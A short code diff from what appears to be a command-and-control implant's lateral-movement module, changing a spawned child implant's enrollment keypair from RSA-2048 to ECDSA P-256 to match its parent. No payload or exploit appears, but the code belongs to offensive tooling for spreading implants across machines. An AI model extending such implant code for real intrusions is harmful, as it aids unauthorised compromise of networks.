@@ -51,8 +51,8 @@ internal static class Lateral
             return (TaskOutcome.Failed, "lateral.move expects '<token>' or '<token> <class>'");
 
         // A child owns its own keypair; only the public half crosses enroll
-        // (architecture.md Sec 9). 2048-bit RSA matches the parent's key size.
-        using var childKey = RSA.Create(2048);
+        // (architecture.md Sec 9). ECDSA P-256, the parent's key shape.
+        using var childKey = ECDsa.Create(ECCurve.NamedCurves.nistP256);
         try
         {
             // The child enrolls against the same endpoint, naming this implant as
